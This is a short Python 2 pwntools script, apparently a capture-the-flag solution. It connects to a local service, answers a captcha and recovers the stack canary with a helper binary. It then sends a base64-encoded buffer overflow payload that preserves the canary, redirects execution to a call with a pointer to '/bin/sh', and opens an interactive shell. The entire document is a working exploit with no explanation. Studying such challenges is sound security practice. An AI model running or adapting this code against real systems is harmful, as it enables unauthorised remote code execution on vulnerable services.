
from pwn import *
import os
from base64 import b64encode

sh = remote('127.0.0.1', 9002)
sh.recvuntil("captcha")

captcha=sh.recvline(timeout=10)
captchapos=captcha.find(' : ')+len(' : ')
captcha=captcha[captchapos:].strip()

sh.sendline(captcha)


print sh.recvline(timeout=1)
print sh.recvline(timeout=1)

print "Calling:","./canary "+captcha
cookie = "0x"+os.popen("./canary2 "+captcha).read().strip()
print "cookie:",cookie
gbuf_addr = int("0x0804b0e0",16)
payload = "A"*512 + p32(int(cookie,16)) + "A"*12 + p32(0x08048880) + "A"*4
shell_addr = gbuf_addr + 0x400 - 0x8

sh.sendline(b64encode(payload + p32(shell_addr))+"/bin/sh\0"*40)
sh.interactive()
